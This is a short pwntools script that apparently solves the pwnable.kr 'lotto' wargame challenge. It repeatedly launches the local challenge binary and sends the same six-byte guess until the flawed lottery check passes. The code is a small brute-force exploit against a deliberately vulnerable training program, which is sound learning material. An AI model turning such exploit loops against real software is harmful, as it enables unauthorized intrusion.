#!/usr/bin/python

from pwn import *

while(1):

    r = process('/home/user/pwnable.kr/lotto/lotto')
    r.recvline(timeout=1)
    r.recvline(timeout=1)
    r.recvline(timeout=1)
    r.recvline(timeout=1)

# play lotto option 1
    print "[+] playing lotto"
    r.sendline(str(1))
    r.recvline(timeout=1)

# send lotto bytes
    print "[+] sending 6 bytes"
    r.sendline('\x01\x0d\x0e\x0e\x06\x06')

